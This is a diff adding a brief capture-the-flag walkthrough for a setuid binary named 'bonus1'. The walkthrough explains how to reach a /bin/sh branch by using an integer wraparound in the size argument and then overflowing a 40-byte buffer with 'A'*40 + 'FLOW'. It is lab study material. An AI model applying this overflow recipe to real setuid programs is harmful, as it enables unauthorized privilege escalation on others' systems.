@@ -1,0 +1,27 @@
+bonus1 walkthrough
+==================
+
+1. 
+$ ls -l
+-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1
+
+2.
+$ ./bonus1
+Segmentation fault (core dumped)
+$ ./bonus1 check
+$
+
+3. ghidra usage 
+
+find main, with if statement, which have /bin/sh, need to rewrite the local_14 to call /bin/sh
+
+4. need to overflow the local_3c[40], so ./bonus1 <num> <"A"*40 + "FLOW">
+
+it will be 44 bite, su need to give num which  num * 4 % (2 ** 32) >= 44
+
+using <range.py> find all possible solutions, checked the max how much can overwrite, when giving 224+ bytes it crashing
+
+all possible solution in solution.txt file
+
+
+5. ./bonus1 <overflow.txt>
